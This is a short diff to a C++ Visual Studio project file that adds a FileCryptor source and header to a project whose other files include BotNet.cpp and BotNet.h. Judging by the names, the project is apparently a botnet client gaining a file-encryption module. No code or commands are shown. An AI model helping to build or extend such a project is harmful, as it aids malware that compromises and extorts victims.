@@ -148,6 +148,7 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="BotNet.cpp" />
+    <ClCompile Include="FileCryptor.cpp" />
     <ClCompile Include="FileManager.cpp" />
     <ClCompile Include="Information.cpp" />
     <ClCompile Include="Manager.cpp" />
@@ -163,6 +164,7 @@
   <ItemGroup>
     <ClInclude Include="BotNet.h" />
     <ClInclude Include="common.h" />
+    <ClInclude Include="FileCryptor.h" />
     <ClInclude Include="FileManager.h" />
     <ClInclude Include="Information.h" />
     <ClInclude Include="Manager.h" />
